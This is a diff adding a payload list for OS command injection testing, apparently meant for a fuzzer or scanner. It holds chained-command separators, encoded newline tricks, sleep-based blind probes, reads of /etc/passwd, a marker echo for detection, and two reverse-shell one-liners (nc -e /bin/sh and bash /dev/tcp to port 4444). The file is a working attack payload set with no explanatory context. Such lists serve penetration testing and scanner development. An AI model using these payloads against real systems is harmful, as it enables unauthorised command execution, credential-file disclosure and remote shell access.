@@ -1,0 +1,51 @@
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+;whoami
+|whoami
+; uname -a
+|uname -a
+;cat /etc/passwd
+|cat /etc/passwd
+;ls -la
+|ls -la
+;pwd
+;pwd;id
+&whoami&
+%0aid
+%0a|id
+%0a;id
+%0a`id`
+%0a$(id)
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 3 127.0.0.1
+| ping -c 3 127.0.0.1
+;curl http://127.0.0.1/
+;wget http://127.0.0.1/
+;nc -e /bin/sh 127.0.0.1 4444
+;bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+$(cat /etc/passwd)
+$(whoami)
+$(uname -a)
+$(ifconfig)
+$(hostname)
+$(id)
+;echo OMNI_MARKER
+|echo OMNI_MARKER
+`echo OMNI_MARKER`
+$(echo OMNI_MARKER)
+;echo%20OMNI_MARKER
+|echo$IFSOMNI_MARKER
+;%20id
+|%20id
+%3b id
+%7c id
+%0d%0a id
+%0a%0did
